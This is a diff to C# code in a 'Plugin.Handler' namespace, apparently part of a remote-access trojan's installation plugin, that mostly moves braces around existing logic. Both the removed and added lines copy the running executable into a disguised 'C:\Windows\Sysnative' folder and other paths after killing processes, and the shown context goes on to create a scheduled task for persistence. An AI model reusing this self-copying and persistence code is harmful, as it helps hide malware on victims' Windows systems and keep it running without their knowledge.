@@ -43,14 +43,14 @@ namespace Plugin.Handler
                                     P.Kill();                                    
                                 }
                             }
-                        }
-                        if (Directory.Exists(@"C:\Windows\Sysnative"))
-                            Directory.Delete(@"C:\Windows\Sysnative");
-                        if (!Directory.Exists(@"C:\Windows\Sysnativetemp"))
-                            Directory.CreateDirectory(@"C:\Windows\Sysnativetemp");
-                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(@"C:\Windows\Sysnativetemp", name), true);
-                        Computer MyComputer = new Computer();
-                        MyComputer.FileSystem.RenameDirectory(@"C:\Windows\Sysnativetemp", "Sysnative");
+                            if (Directory.Exists(@"C:\Windows\Sysnative"))
+                                Directory.Delete(@"C:\Windows\Sysnative");
+                            if (!Directory.Exists(@"C:\Windows\Sysnativetemp"))
+                                Directory.CreateDirectory(@"C:\Windows\Sysnativetemp");
+                            File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(@"C:\Windows\Sysnativetemp", name), true);
+                            Computer MyComputer = new Computer();
+                            MyComputer.FileSystem.RenameDirectory(@"C:\Windows\Sysnativetemp", "Sysnative");
+                        }                        
                     }
                     catch
                     {
@@ -69,8 +69,8 @@ namespace Plugin.Handler
                                     }
                                     catch { }
                                 }
-                            }
-                            File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                                File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                            }                            
                         } 
                         catch 
                         {
@@ -110,8 +110,8 @@ namespace Plugin.Handler
                                 }
                                 catch { }
                             }
-                        }
-                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                            File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                        }                        
                     }
                     catch
                     {
@@ -128,8 +128,8 @@ namespace Plugin.Handler
                                 }
                                 catch { }
                             }
-                        }
-                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                            File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                        }                        
                     }
                     TaskService ts = new TaskService();
                     TaskDefinition td = ts.NewTask();
